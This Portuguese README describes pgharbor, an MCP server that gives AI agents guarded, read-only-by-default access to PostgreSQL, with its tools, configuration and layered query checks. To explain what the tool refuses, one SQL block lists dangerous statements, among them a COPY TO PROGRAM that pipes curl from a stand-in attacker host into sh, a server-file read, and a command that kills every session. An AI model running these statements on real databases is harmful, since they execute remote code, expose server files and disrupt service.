<p align="center">
  <img src="assets/banner-dark.svg#gh-dark-mode-only" alt="pgharbor: um porto seguro entre agentes de IA e o PostgreSQL" width="100%">
  <img src="assets/banner-light.svg#gh-light-mode-only" alt="pgharbor: um porto seguro entre agentes de IA e o PostgreSQL" width="100%">
</p>

<p align="center">
  <a href="https://github.com/DanielFreitasDev/pgharbor/actions/workflows/ci.yml"><img src="https://github.com/DanielFreitasDev/pgharbor/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <img src="https://img.shields.io/badge/PostgreSQL-9.6%20→%2019-336791?logo=postgresql&logoColor=white" alt="PostgreSQL 9.6 a 19">
  <img src="https://img.shields.io/badge/Python-3.11%20→%203.14-3776ab?logo=python&logoColor=white" alt="Python 3.11 a 3.14">
  <img src="https://img.shields.io/badge/MCP-2026--07--28-0f8f83" alt="MCP 2026-07-28">
  <a href="LICENSE"><img src="https://img.shields.io/badge/licença-MIT-15803d" alt="Licença MIT"></a>
</p>

<p align="center">
  <a href="README.md">English</a> · <b>Português</b>
</p>

O **pgharbor** é um servidor [MCP](https://modelcontextprotocol.io) (Model Context
Protocol, o padrão que liga agentes de IA a ferramentas) que entrega ao agente o
PostgreSQL inteiro (schema, dados, planos de execução, desempenho, replicação, segurança
e manutenção) sem entregar as chaves.

Ele é somente leitura por padrão, pede autorização a uma pessoa antes de tocar em
produção ou de alterar qualquer coisa, e não confia na transação somente leitura para
proteger o banco, porque ela não protege. Funciona com todo PostgreSQL do 9.6 ao 19.

<p align="center">
  <img src="assets/demo-query-dark.svg#gh-dark-mode-only" alt="Um agente explorando um schema e rodando uma consulta protegida" width="100%">
  <img src="assets/demo-query-light.svg#gh-light-mode-only" alt="Um agente explorando um schema e rodando uma consulta protegida" width="100%">
</p>

## Por que mais um servidor de PostgreSQL para agentes

A maioria roda o SQL do agente dentro de `BEGIN READ ONLY` e chama isso de seguro. Dentro
dessa transação, tudo isto continua funcionando:

```sql
SELECT pg_terminate_backend(pid) FROM pg_stat_activity;      -- derruba todas as sessões
SELECT pg_read_file('pg_hba.conf');                          -- lê arquivos do servidor
COPY (SELECT 1) TO PROGRAM 'curl atacante.example | sh';     -- executa um programa
SELECT set_config('statement_timeout', '0', false);          -- tira o limite de tempo
SELECT pg_advisory_lock(1);                                  -- um lock que sobrevive ao rollback
SET transaction_read_only = off;                             -- ... e agora pode escrever
```

O pgharbor recusa cada um deles, e prova isso em onze versões do PostgreSQL a cada commit.

| | Servidor "somente leitura" comum | pgharbor |
|---|---|---|
| Quem decide o tipo da instrução | uma lista de palavras ou um parser no cliente | **o próprio PostgreSQL**, por subconsulta e protocolo estendido |
| Funções com efeito colateral | executam | recusadas pelo nome, na instrução, dentro de views, políticas, corpos de função, operadores e conversões de tipo |
| Resultados e valores enormes | devolvidos, ou cortados depois de transferidos | limitados e cortados **no servidor** |
| Colunas sensíveis e tabelas gigantes | não tratadas | colunas protegidas, "filtro por índice obrigatório", teto de custo |
| Produção | igual a qualquer banco | uma pessoa aprova, uma vez por sessão |
| Escrita | uma opção ligada | modo de acesso por conexão, simulação, confirmação humana, auditoria |
| Versões do PostgreSQL | as recentes | **9.6 a 19**, todas testadas |
| Estado de sessão entre chamadas | vaza | apagado com `DISCARD ALL` |

## Começo rápido

Você precisa do [uv](https://docs.astral.sh/uv/getting-started/installation/) (ele já traz o Python).

**1. Aponte para um banco.** O jeito mais rápido é uma variável de ambiente:

```bash
export PGHARBOR_DSN="postgresql://usuario:senha@localhost:5432/meubanco"
```

Para mais de um banco, ou para usar as regras descritas abaixo, crie o arquivo de
configuração:

```bash
uvx --from git+https://github.com/DanielFreitasDev/pgharbor pgharbor init    # cria ~/.config/pgharbor/config.toml
uvx --from git+https://github.com/DanielFreitasDev/pgharbor pgharbor check   # valida o arquivo e testa as conexões (produção só quando citada)
```

**2. Adicione ao seu agente.**

<details open>
<summary><b>Claude Code</b></summary>

```bash
claude mcp add pgharbor --scope user -- uvx --from git+https://github.com/DanielFreitasDev/pgharbor pgharbor
```

Depois peça: *"use o pgharbor para listar as tabelas do banco dev"*.

</details>

<details>
<summary><b>Claude Desktop, Cursor, Windsurf</b> (JSON com <code>mcpServers</code>)</summary>

```json
{
  "mcpServers": {
    "pgharbor": {
      "command": "uvx",
      "args": ["--from", "git+https://github.com/DanielFreitasDev/pgharbor", "pgharbor"]
    }
  }
}
```

</details>

<details>
<summary><b>Codex CLI</b></summary>

```toml
# ~/.codex/config.toml
[mcp_servers.pgharbor]
command = "uvx"
args = ["--from", "git+https://github.com/DanielFreitasDev/pgharbor", "pgharbor"]
```

</details>

<details>
<summary><b>VS Code</b> e <b>Gemini CLI</b></summary>

```json
// .mcp.json na raiz do projeto (o mesmo arquivo que o Claude Code lê)
{ "mcpServers": { "pgharbor": { "type": "stdio", "command": "uvx",
  "args": ["--from", "git+https://github.com/DanielFreitasDev/pgharbor", "pgharbor"] } } }
```

```json
// ~/.gemini/settings.json
{ "mcpServers": { "pgharbor": { "command": "uvx",
  "args": ["--from", "git+https://github.com/DanielFreitasDev/pgharbor", "pgharbor"] } } }
```

</details>

Para fixar uma versão, acrescente `@v0.1.0` ao endereço do Git. Mais detalhes em
[docs/clients.md](docs/clients.md).

## Como uma consulta fica segura

<p align="center">
  <img src="assets/layers-dark.svg#gh-dark-mode-only" alt="As seis camadas por onde toda consulta passa" width="100%">
  <img src="assets/layers-light.svg#gh-light-mode-only" alt="As seis camadas por onde toda consulta passa" width="100%">
</p>

Toda consulta passa por seis camadas, e qualquer uma pode recusar:

1. **Análise léxica.** O texto é dividido em símbolos do mesmo jeito que o PostgreSQL
   divide. Recusa duas instruções, texto sem fechamento e o que for ambíguo.
2. **Conferência no catálogo.** Cada nome citado é procurado no catálogo do servidor.
   Recusa funções com efeito colateral, onde quer que se escondam: na instrução, numa
   view, numa política de segurança de linha, no corpo de outra função, atrás de um
   operador próprio, de uma conversão de tipo ou da regra (`CHECK`) de um domínio. Função
   que monta o SQL em tempo de execução não tem como ser conferida: é recusada até você
   liberá-la pelo nome.
3. **O servidor decide.** A consulta vai como `SELECT * FROM (<consulta>) AS q` pelo
   protocolo estendido. Dentro de uma subconsulta só uma leitura é SQL válido, e o
   protocolo aceita uma única instrução. Nenhuma lista de palavras nossa pode ser
   enganada sobre o que a instrução é, porque ninguém pergunta a ela.
4. **Pré-voo.** O plano de execução (`EXPLAIN`) é conferido antes de rodar: tabelas
   negadas, varredura completa de tabela protegida, custo acima do teto.
5. **Execução limitada.** Linhas e tamanho de cada valor são cortados no servidor.
6. **Rollback** e limpeza da sessão.

Cada camada, o que ela barra e onde a proteção termina estão em
[docs/security.md](docs/security.md).

<p align="center">
  <img src="assets/demo-refused-dark.svg#gh-dark-mode-only" alt="O que acontece quando o agente passa do limite" width="100%">
  <img src="assets/demo-refused-light.svg#gh-light-mode-only" alt="O que acontece quando o agente passa do limite" width="100%">
</p>

## Ferramentas

As ferramentas se adaptam ao servidor: a mesma chamada funciona no 9.6 e no 19, e avisa
com clareza quando um recurso não existe naquela versão. Referência completa, com
parâmetros: [docs/tools.md](docs/tools.md) (em inglês, gerada do próprio código).

<!-- tools:start -->

<details>
<summary><b>Core</b> · 8 tools · Connections, guarded queries and plans.</summary>

| Tool | What it does |
|---|---|
| `pg_connections` | List the configured PostgreSQL connections: name, environment, access mode, limits. |
| `pg_request_access` | Ask the user to approve the use of a protected connection (for example production). |
| `pg_server_info` | Show PostgreSQL version, uptime, current role and privileges, database size, key settings, installed extensions and which optional features this server supports. |
| `pg_query` | Run one read-only SQL query (SELECT, WITH, VALUES, TABLE, SHOW) and return the rows. |
| `pg_explain` | Show the execution plan of a read query (EXPLAIN) without running it. |
| `pg_validate_sql` | Check a read query without executing it: syntax, object names, safety rules, result columns with types, tables it would touch and its estimated cost. |
| `pg_policy` | Explain what is allowed on a connection: access mode, approval, limits, function policy, protected tables and columns, denied relations. |
| `pg_audit_log` | Show the most recent entries of pgharbor's audit log: which tool ran, on which connection, the SQL, the outcome and the rule that refused it. |

</details>

<details>
<summary><b>Schema</b> · 13 tools · Find your way around: objects, definitions, DDL, dependencies.</summary>

| Tool | What it does |
|---|---|
| `pg_list_schemas` | List the schemas (namespaces) of the database with owner, comment, how many tables, views, sequences and functions each holds, and approximate size. |
| `pg_list_tables` | List tables (and optionally views, materialized views, foreign tables) with estimated row count, size on disk and comment. |
| `pg_describe_table` | Describe one table, view, materialized view or foreign table. |
| `pg_list_objects` | List objects of ONE kind. |
| `pg_describe_object` | Describe one object that is not a table: a function, procedure, aggregate, sequence, type, index, trigger, extension or schema. |
| `pg_get_ddl` | Rebuild the CREATE statement (DDL, as SQL text) of a table, view, materialized view, function, procedure, sequence, type (enum, domain, composite, range), index, trigger or schema. |
| `pg_search` | Find database objects by name. |
| `pg_search_source` | Find functions, procedures, views, materialized views and triggers whose source code contains a text, and return the matching lines with their line numbers. |
| `pg_dependencies` | Show what depends on an object and what it depends on, to answer "what breaks if I drop or change this?". |
| `pg_relationships` | Show the foreign key graph: which table references which, through which columns, with ON DELETE / ON UPDATE actions. |
| `pg_schema_overview` | Give a compact map of one schema that costs few tokens. |
| `pg_compare_schemas` | Compare one schema on two connections (for example development and production, or before and after a migration). |
| `pg_list_partitions` | Show the partitions of a partitioned table as a tree. |

</details>

<details>
<summary><b>Data</b> · 4 tools · Look at rows and column statistics, through the guarded path.</summary>

| Tool | What it does |
|---|---|
| `pg_sample_rows` | Show a few rows of a table or view to see what the data looks like. |
| `pg_count_rows` | Count the rows of a table: an instant estimate from the planner statistics, and with `exact=true` the real count(*). |
| `pg_column_stats` | Describe the data of each column from the planner statistics, without reading the table. |
| `pg_export_query` | Run a read-only query and save the result to a local file (CSV, JSON or JSON Lines) instead of sending the rows to the conversation. |

</details>

<details>
<summary><b>Performance</b> · 12 tools · What the server is doing and where time and space go.</summary>

| Tool | What it does |
|---|---|
| `pg_activity` | Show who is connected right now. |
| `pg_locks` | Show lock waits as a blocking tree. |
| `pg_top_queries` | Rank the queries of the current database from pg_stat_statements. |
| `pg_table_stats` | Show per-table activity from pg_stat_user_tables. |
| `pg_index_stats` | List indexes with size, scans, tuples read and fetched, unique/primary/valid flags, access method and definition, and find the ones to drop. |
| `pg_bloat` | Estimate how much space tables and btree indexes waste (bloat) and rank them by wasted bytes, without scanning anything. |
| `pg_vacuum_status` | Report the state of vacuum and autovacuum. |
| `pg_sizes` | Find what takes the space: the biggest databases, schemas, tables (with heap data, indexes and TOAST shown separately), indexes or tablespaces, largest first. |
| `pg_cache_io` | Report cache effectiveness and I/O. |
| `pg_progress` | Show long operations that are running now with their progress. |
| `pg_database_stats` | Show pg_stat_database for the current database (or every database with `all_databases=true`). |
| `pg_stat_view` | Read any system view or catalog table from pg_catalog or information_schema by name, for example pg_stat_user_functions, pg_stat_slru, pg_stat_ssl, pg_prepared_xacts, pg_stat_wal, pg_stat_replication or pg_replication_slots. |

</details>

<details>
<summary><b>Health</b> · 5 tools · Check-ups, index advice, settings, sequences, WAL.</summary>

| Tool | What it does |
|---|---|
| `pg_settings` | Search server configuration parameters (GUCs). |
| `pg_sequences_health` | Find sequences that are running out of numbers. |
| `pg_wal_checkpoints` | Explain how checkpoints and WAL behave. |
| `pg_index_advisor` | Suggest indexes. |
| `pg_health_check` | Run a quick DBA check-up and return findings ranked by severity. |

</details>

<details>
<summary><b>Replication</b> · 1 tool · Standbys, slots, publications and subscriptions.</summary>

| Tool | What it does |
|---|---|
| `pg_replication` | Show the replication state of the server in one answer. |

</details>

<details>
<summary><b>Security</b> · 4 tools · Roles, privileges, audits. Never returns a secret.</summary>

| Tool | What it does |
|---|---|
| `pg_roles` | List database roles (users and groups) with their attributes (superuser, createdb, createrole, login, replication, bypassrls), connection limit, password expiry, the roles each one belongs to (`member_of`) and its members,... |
| `pg_privileges` | Show access rights, in one of two ways. |
| `pg_security_audit` | Audit the database for security weaknesses and rank the findings as critical, warning or info, each with a recommendation. |
| `pg_find_sensitive_columns` | Find columns that look like they hold sensitive data, judging by column name, comment and type only. |

</details>

<details>
<summary><b>Extensions</b> · 3 tools · Installed extensions and what they add; integrity checks.</summary>

| Tool | What it does |
|---|---|
| `pg_extensions` | List the extensions installed in this database (version, schema, whether a newer version can be installed with ALTER EXTENSION ... |
| `pg_extension_report` | Report on one installed extension: version, schema, the objects it created (functions, types, tables, operators), its settings, and extension-specific facts. |
| `pg_integrity_check` | Look for data integrity problems. |

</details>

<details>
<summary><b>Administration</b> · 4 tools · Change the database. Only on connections configured for it, always confirmed by the user.</summary>

| Tool | What it does |
|---|---|
| `pg_execute` | Run ONE statement that changes data or structure. |
| `pg_maintenance` | Run a maintenance command on a table, index or materialized view. |
| `pg_signal_backend` | Cancel the running query of another session (`cancel`) or close the session entirely (`terminate`), by process id. |
| `pg_import_csv` | Bulk-load a local CSV file into an existing table with COPY, in one transaction. |

</details>

<!-- tools:end -->

O que não tem ferramenta dedicada continua ao alcance: `pg_query` roda qualquer leitura
em qualquer catálogo, e `pg_stat_view` lê qualquer view de estatística pelo nome,
inclusive as que versões futuras criarem.

## Configuração

Um arquivo TOML, e só ele decide o que cada conexão pode fazer. Nada do que o agente
disser muda isso.

```toml
[connections.dev]
host = "localhost"
dbname = "app"
user_env = "APP_DB_USER"            # segredos ficam em variáveis de ambiente
password_env = "APP_DB_PASSWORD"
access = "read-write"               # read-only | read-write | admin

[connections.prod]
environment = "production"          # uma pessoa aprova o uso, uma vez por sessão
host = "db.interno"
dbname = "app"
user_env = "APP_DB_USER"
password_env = "APP_DB_PASSWORD"
access = "read-only"
max_plan_cost = 500000              # recusa consultas que o planejador considera pesadas

[[connections.prod.protect]]
table = "financeiro.cartoes"
deny_columns = ["numero", "cvv"]    # nunca legíveis, não importa como a consulta é escrita
require_index_filter = true         # proíbe varrer a tabela inteira
note = "Filtre por id ou cliente_id."
```

O arquivo também define a política de funções, o mascaramento de credenciais, os
limites, a auditoria e as **ferramentas próprias**: uma consulta que você aprova vira
uma ferramenta com nome, e assim produção pode dispensar SQL livre. Tudo em
[docs/configuration.md](docs/configuration.md).

### As regras em palavras simples

| Regra | O que faz |
|---|---|
| `access` | `read-only` só lê; `read-write` também faz INSERT, UPDATE, DELETE, MERGE e CALL; `admin` também altera estrutura e roda manutenção |
| `environment = "production"` | antes do primeiro uso na sessão, aparece uma caixa pedindo a sua aprovação |
| `protect` com `deny_columns` | a coluna não pode ser lida, filtrada nem usada em expressão; `SELECT *` na tabela é recusado |
| `protect` com `require_index_filter` | só passa a consulta cujo plano use um índice com condição naquela tabela |
| `max_plan_cost` | recusa a consulta se o custo estimado pelo planejador passar do valor |
| `function_policy` | `strict` só aceita funções embutidas seguras; `standard` também aceita funções suas marcadas IMMUTABLE/STABLE, depois de inspecionar o código; `permissive` só recusa as perigosas |
| `redact_columns` | colunas com nome de credencial (senha, token, segredo) voltam como `[redacted]` |
| `statement_timeout`, `max_rows`, `max_cell_chars` | tempo máximo, linhas e tamanho de cada valor |

## Onde ele fica

<p align="center">
  <img src="assets/architecture-dark.svg#gh-dark-mode-only" alt="Como o pgharbor fica entre o agente e os bancos" width="100%">
  <img src="assets/architecture-light.svg#gh-light-mode-only" alt="Como o pgharbor fica entre o agente e os bancos" width="100%">
</p>

É um processo local, iniciado pelo seu cliente MCP, que conversa por entrada e saída
padrão. Não abre porta de rede e não envia telemetria.

## Compatibilidade

| | Suportado | Como é conferido |
|---|---|---|
| PostgreSQL | 9.6, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 | a suíte de integração roda em cada versão |
| Python | 3.11 a 3.14 | testes unitários em cada versão |
| MCP | 2025-11-25 e 2026-07-28 | testes de protocolo nas duas, incluindo as caixas de confirmação |
| Pooler de conexões | PgBouncer (modo transação) | testado; os ajustes são aplicados por transação quando o pooler recusa as opções de conexão |
| Sistemas | Linux, macOS, Windows | a suíte com banco roda no Linux; testes unitários e partida do servidor nos três |

Detalhes e a tabela de recursos por versão: [docs/compatibility.md](docs/compatibility.md).

## Perguntas

<details>
<summary><b>Ele pode alterar meus dados?</b></summary>

Só numa conexão em que você definiu `access` como `read-write` ou `admin` no arquivo de
configuração, uma instrução por vez, e por padrão só depois de você confirmar numa
caixa de diálogo. Numa configuração somente leitura, as ferramentas de escrita nem aparecem.

</details>

<details>
<summary><b>O modo somente leitura basta para produção?</b></summary>

São várias camadas, testadas com mais de 180 ataques em cada versão suportada, e o
[documento de segurança](docs/security.md) diz com clareza onde estão os limites. A
configuração mais forte soma a isso um papel (usuário) de banco só com os privilégios
de que o agente precisa: com ele, quase tudo o que o pgharbor bloqueia nem chega a
existir como risco.

</details>

<details>
<summary><b>Por que não usar uma biblioteca de parser do PostgreSQL?</b></summary>

Um parser no cliente é um programa diferente do servidor, e qualquer diferença entre os
dois é uma porta de entrada: foi assim que assistentes de SQL já foram contornados. O
pgharbor deixa o servidor decidir o que a instrução é. O analisador próprio só procura
nomes, erra para o lado seguro de propósito e é testado contra o analisador real do
PostgreSQL.

</details>

<details>
<summary><b>Ele envia meus dados para algum lugar?</b></summary>

Não. É um processo local, que fala com os seus bancos e com o cliente MCP que o iniciou.

</details>

<details>
<summary><b>E servidores bem antigos?</b></summary>

O PostgreSQL 9.6 é suportado e testado como os demais. Ferramentas que dependem de um
recurso mais novo (particionamento declarativo, `pg_stat_io` etc.) dizem em que versão
ele surgiu.

</details>

## Desenvolvimento

```bash
git clone https://github.com/DanielFreitasDev/pgharbor && cd pgharbor
uv sync --group dev --group oracle
scripts/pg-matrix.sh up          # PostgreSQL 9.6 a 19 em containers
uv run pytest                    # tudo, em todas as versões
```

Veja [CONTRIBUTING.md](CONTRIBUTING.md) e [docs/writing-tools.md](docs/writing-tools.md).
Falhas de segurança: [SECURITY.md](SECURITY.md).

## Licença

[MIT](LICENSE). Use, altere e distribua como quiser.

O código do pgharbor não tem cláusula de copyleft. Em execução ele depende do
[SDK oficial de MCP para Python](https://github.com/modelcontextprotocol/python-sdk)
(MIT), do [pydantic](https://github.com/pydantic/pydantic) (MIT) e do
[psycopg](https://www.psycopg.org/) (LGPL-3.0, usado como biblioteca, sem modificação).
